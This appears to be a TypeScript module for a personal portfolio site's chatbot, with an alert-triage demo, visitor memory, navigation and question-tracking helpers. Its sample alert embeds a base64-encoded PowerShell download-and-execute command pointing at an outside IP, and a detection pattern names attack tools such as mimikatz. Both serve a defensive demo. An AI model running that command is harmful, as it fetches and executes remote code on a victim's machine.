import { agentJSON, FAST, BIG } from './llm'
import { safe, dayKey } from '@/lib/alerts/store'
import { projects } from '@/data/projects'
import type { Passage } from './corpus'

// Smaller PWEZA capabilities: live triage demo, smart follow-ups, returning-visitor memory,
// time awareness, deep-dive / tour detection, and tracking questions PWEZA couldn't answer.

// ---------- 🧪 Live skill demo: triage a pasted alert the way BLUE SOC would ----------

export function looksLikeAlert(text: string) {
  if (text.length < 60) return false
  const hits = [
    /\b\d{1,3}(\.\d{1,3}){3}\b/, /\b(event ?id|eventcode|alert|severity|src_?ip|dest_?ip|signature|sigma|suricata|sysmon|powershell|failed (login|logon)|4625|4688|4624|cmd\.exe|base64|beacon|c2|mimikatz)\b/i,
    /\d{4}-\d{2}-\d{2}[ t]\d{2}:\d{2}/, /\b(user|host|process|parent|hash|sha256|md5)\s*[=:]/i,
  ].filter((re) => re.test(text)).length
  return hits >= 2
}

export const SAMPLE_ALERT = '2026-11-20T03:14:07Z host=WS-0142 user=jdoe EventID=4688 process=powershell.exe parent=winword.exe cmdline="powershell -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOAA1AC4AMgAyADAALgAxADAAMQAuADQAMgAvAGEAJwApAA==" dest_ip=185.220.101.42'

export type Triage = { verdict: string; severity: 'Low' | 'Medium' | 'High' | 'Critical'; mitre: { id: string; name: string }[]; why: string[]; next: string[] }

export async function triageDemo(alert: string): Promise<Triage | null> {
  const r = await agentJSON<any>(
    `You demonstrate how Joseph's BLUE SOC triage pipeline reasons about an alert (an educational demo, not a real investigation).
Analyse the pasted alert/log. Return JSON:
{"verdict": "one line, e.g. Likely malicious: Office spawning encoded PowerShell", "severity": "Low"|"Medium"|"High"|"Critical",
 "mitre": [{"id":"T1059.001","name":"PowerShell"}] (1-3 accurate ATT&CK techniques),
 "why": [2-4 short evidence lines from the alert], "next": [3 short analyst next steps, ending with a human approval step before containment]}`,
    alert.slice(0, 3000),
    { model: BIG, maxTokens: 500, timeoutMs: 15000 },
  )
  if (!r || !r.verdict) return null
  const sev = ['Low', 'Medium', 'High', 'Critical'].includes(r.severity) ? r.severity : 'Medium'
  return {
    verdict: String(r.verdict).slice(0, 160), severity: sev,
    mitre: (r.mitre || []).slice(0, 3).map((m: any) => ({ id: String(m.id || '').slice(0, 12), name: String(m.name || '').slice(0, 60) })).filter((m: any) => /^T\d{4}/.test(m.id)),
    why: (r.why || []).slice(0, 4).map((x: any) => String(x).slice(0, 160)),
    next: (r.next || []).slice(0, 4).map((x: any) => String(x).slice(0, 160)),
  }
}

// ---------- 💡 Smart follow-up chips ----------

export async function followUps(question: string, answer: string, expert: string): Promise<string[]> {
  const r = await agentJSON<{ suggestions?: string[] }>(
    `Suggest 3 short follow-up questions (max 7 words each) a recruiter or engineer might ask next about Joseph, based on this exchange. Topic: ${expert}. Return {"suggestions": [..3 strings]}. Don't repeat the question.`,
    `Q: ${question.slice(0, 400)}\nA: ${answer.slice(0, 700)}`,
    { model: FAST, maxTokens: 90, timeoutMs: 2500 },
  )
  return (r?.suggestions || []).filter((s) => typeof s === 'string' && s.length > 3 && s.length < 70).slice(0, 3)
}

// ---------- 🧠 Returning-visitor memory (per anonymous visitor ID) ----------

export type Memory = { topics: string[]; questions: string[]; lastAt: number; visits: number }
export const validVid = (v: unknown): v is string => typeof v === 'string' && /^[a-z0-9]{8,40}$/i.test(v)

export async function getMemory(vid: string): Promise<Memory | null> {
  return safe((r) => r.get<Memory>(`pzmem:${vid}`), null)
}

export async function remember(vid: string, question: string, topic: string) {
  await safe(async (r) => {
    const m = (await r.get<Memory>(`pzmem:${vid}`)) || { topics: [], questions: [], lastAt: 0, visits: 0 }
    const newVisit = Date.now() - m.lastAt > 30 * 60_000
    const next: Memory = {
      topics: Array.from(new Set([topic, ...m.topics])).filter((t) => t !== 'general').slice(0, 4),
      questions: [question.slice(0, 160), ...m.questions.filter((q) => q !== question)].slice(0, 4),
      lastAt: Date.now(), visits: m.visits + (newVisit ? 1 : 0),
    }
    await r.set(`pzmem:${vid}`, next, { ex: 60 * 86_400 })
  }, null)
}

export function memoryContext(m: Memory | null) {
  if (!m || !m.questions.length) return ''
  const days = Math.round((Date.now() - m.lastAt) / 86_400_000)
  return `\n\nRETURNING VISITOR: they chatted with you ${days <= 0 ? 'earlier today' : days === 1 ? 'yesterday' : `${days} days ago`} about ${m.topics.join(', ') || 'his work'}. Earlier questions: ${m.questions.join(' | ')}. Use this naturally if relevant; don't recite it.`
}

// ---------- 🌍 Time awareness ----------

export function timeContext(visitorTz: string | null, josephTz: string) {
  const fmt = (tz: string) => { try { return new Intl.DateTimeFormat('en-US', { timeZone: tz, hour: 'numeric', minute: '2-digit', weekday: 'short' }).format(new Date()) } catch { return '' } }
  const jHour = (() => { try { return Number(new Intl.DateTimeFormat('en-US', { timeZone: josephTz, hour: 'numeric', hourCycle: 'h23' }).format(new Date())) } catch { return 12 } })()
  const night = jHour >= 22 || jHour < 7
  return `\n\nTIME: it's ${fmt(josephTz)} for Joseph${visitorTz && visitorTz !== josephTz ? ` and ${fmt(visitorTz)} for the visitor` : ''}.${night ? ' It is night for Joseph: if they want to reach him live, mention he may be asleep and email or the briefing is the best next step.' : ''}`
}

export function josephIsNight(tz: string) {
  try { const h = Number(new Intl.DateTimeFormat('en-US', { timeZone: tz, hour: 'numeric', hourCycle: 'h23' }).format(new Date())); return h >= 22 || h < 7 } catch { return false }
}

// ---------- 🧭 Tour guide + 🔬 deep dive ----------

export const wantsNavigation = (t: string) => /\b(show me|take me|open|go to|navigate to|bring up|where can i see|let me see)\b/i.test(t)
export const wantsDeepDive = (t: string) => /\b(walk me through|deep dive|deep-dive|in depth|in detail|step by step|explain how .{0,40}(works|built|was built)|how (does|did) .{0,40} work|architecture of)\b/i.test(t)

export function projectFromSources(sources: Passage[]) {
  for (const s of sources) {
    const m = s.href.match(/^\/projects\/([^/#]+)/)
    if (m) {
      const p = projects.find((x) => x.id === m[1] && x.placement)
      if (p) return p
    }
  }
  return null
}

export function projectCard(p: (typeof projects)[number]) {
  return { title: p.title, subtitle: p.subtitle, href: `/projects/${p.id}`, image: p.screenshot || null, status: p.status || 'case-study', stack: p.stack.slice(0, 5) }
}

/** The best place on the site to show for this answer (a section anchor if one fits). */
export function navTarget(question: string, sources: Passage[]): string | null {
  const t = question.toLowerCase()
  const p = projectFromSources(sources)
  if (p) return `/projects/${p.id}${/\b(code|source)\b/.test(t) ? '#source-code' : /\b(proof|evidence|result)\b/.test(t) ? '#evidence' : /\b(architecture|design|diagram|how)\b/.test(t) ? '#architecture' : ''}`
  if (/\bcert/.test(t)) return '/#credentials'
  if (/\bskill/.test(t)) return '/#skills'
  if (/\b(experience|job history|work history)\b/.test(t)) return '/#experience'
  if (/\b(contact|email|reach)\b/.test(t)) return '/#contact'
  if (/\b(project|work)\b/.test(t)) return '/#work'
  return sources[0]?.href || null
}

// ---------- ❓ Questions PWEZA couldn't answer (for Joseph to teach) ----------

export const couldNotAnswer = (answer: string) => /won't guess|don't have a verified answer|not something the site covers|isn't documented on this site/i.test(answer)

export async function trackUnanswered(question: string, tz: string) {
  await safe(async (r) => {
    const d = dayKey(Date.now(), tz)
    await r.lpush(`unanswered:${d}`, question.slice(0, 300))
    await r.ltrim(`unanswered:${d}`, 0, 49)
    await r.expire(`unanswered:${d}`, 14 * 86_400)
  }, null)
}

export async function unansweredFor(day: string): Promise<string[]> {
  return safe(async (r) => Array.from(new Set(await r.lrange<string>(`unanswered:${day}`, 0, 49))), [])
}

/** Short id for a question so Telegram buttons can refer to it (callback data is limited to 64 bytes). */
export async function stashQuestion(q: string): Promise<string> {
  const id = Math.random().toString(36).slice(2, 10)
  await safe((r) => r.set(`pzq:${id}`, q.slice(0, 500), { ex: 30 * 86_400 }), null)
  return id
}
export async function stashedQuestion(id: string) {
  return safe((r) => r.get<string>(`pzq:${id}`), null)
}

// ---------- 🟢 Joseph online presence ----------

export async function setOnline(on: boolean) {
  await safe(async (r) => { if (on) await r.set('joseph:online', Date.now(), { ex: 8 * 3600 }); else await r.del('joseph:online') }, null)
}
export async function isOnline() {
  return safe(async (r) => !!(await r.get('joseph:online')), false)
}
